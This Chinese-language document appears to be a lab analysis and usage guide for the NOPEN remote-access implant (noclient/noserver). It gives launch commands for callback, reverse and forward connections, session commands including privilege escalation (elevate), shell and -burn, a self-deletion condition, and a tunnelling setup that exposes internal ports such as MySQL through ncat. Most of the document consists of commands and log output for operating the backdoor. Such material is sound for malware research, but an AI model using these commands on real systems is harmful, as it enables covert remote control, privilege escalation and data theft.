### 进程与监听
- **进程ID (父进程ID)**: 8072 (7980)
- **监听端口**: 2007

### 日志记录
- **时间戳**: [03-17-22 06:12:38 GMT]
- **连接信息**: [localhost:23223 -> centos4x86.local.172.19.2.11:32754]
- **操作**: [-listen 2007]

**日志详情**:
- 启动监听器在端口 2007 上。
- noclient: 等待服务器响应...
- noclient: 服务器成功分叉出新进程，PID 为 1509949440。

### 客户端命令
- **命令**: ./noclient-3.3.2.3-linux-i386 -l 9999
- **调用**: -call 172.19.2.13 9999
- **时间戳**: [03-17-22 06:28:22 GMT]
- **连接信息**: [localhost:23223 -> centos4x86.local.172.19.2.11:32754]
- **操作**: [-call 172.19.2.13 9999]

**日志详情**:
- 初始化回调至 172.19.2.13:9999。
- noclient: 等待服务器响应...
- noclient: 服务器成功分叉出新进程，PID 为 922746880。

### 退出与清理
- **条件**: 如果只有一个服务端程序在运行，则删除服务端程序并退出进程。

### 常用远程服务器命令
- **查看环境变量**
- **显示进程列表**
- **提权**

### 示例命令
- **提升权限**: elevate
- **显示进程信息**: ps
- **启动 shell**: shell
- **销毁会话**: -burn
- **获取时间信息**: -time
- **显示连接状态**: status
- **设置/获取环境变量**: setenv / getenv
- **批量执行脚本命令**: gs

### 时间敏感性
- nopen 对时间非常敏感，包含大量时间相关函数，可能用于环境检测及自动退出机制。

### 连接状态
- **本地主机和端口**: localhost:47388 (127.0.0.1:47388)
- **远程主机和端口**: 172.19.2.11:32754 (centos4x86.local:32754)
- **NOPEN 版本**: 本地客户端 3.3.2.3，远程服务器 3.3.0.1（版本不匹配）
- **当前工作目录**: 本地 /home/hacker/test，远程 /root/bvp47
- **进程 ID (父进程 ID)**: 本地 1019 (2817)，远程 7847 (7030)

### 脚本批量执行
- 在 NHOME/etc 目录下编写脚本，并通过 gs 命令执行。例如：
  - 设置环境变量: -setenv TARGET=nsa.org
  - 获取环境变量: -getenv
  - 执行命令: ping $TARGET

### 反向连接
- 使用 noserver 的启动参数实现反向连接到 noclient。
- 先启动客户端，再启动服务端，即可建立反向连接。

### 指定服务端口的正向连接
- **服务端启动命令**: D="-s -l9999" ./noserver-3.1.0.1-i686.pc.linux.gnu.redhat-ES
- **客户端启动命令**: ./noclient-3.1.0.2-i686.pc.linux.gnu.redhat-ES 172.19.2.15 9999

### 隧道利用
- 使用 ncat 演示内网端口映射到外网，例如将 MySQL 端口映射出来进行操作。
- **服务端启动命令**: D="-s " ./noserver-3.1.0.1-i686.pc.linux.gnu.redhat-ES
- **客户端启动命令**: ./noclient-3.1.0.2-i686.pc.linux.gnu.redhat-ES -c "-gs /home/hacker/NHOME/etc/gs.auto" 172.19.2.15:9999

### 未知功能
- **autopot**: 功能未知，但存在字符串 "Read failed ditching gui"，可能涉及图形界面控制。
- **incision**: 存在字符串 "Entering INCISION mode"，但具体使用方式及与 dewdrop, tipoff 的关联尚不清楚。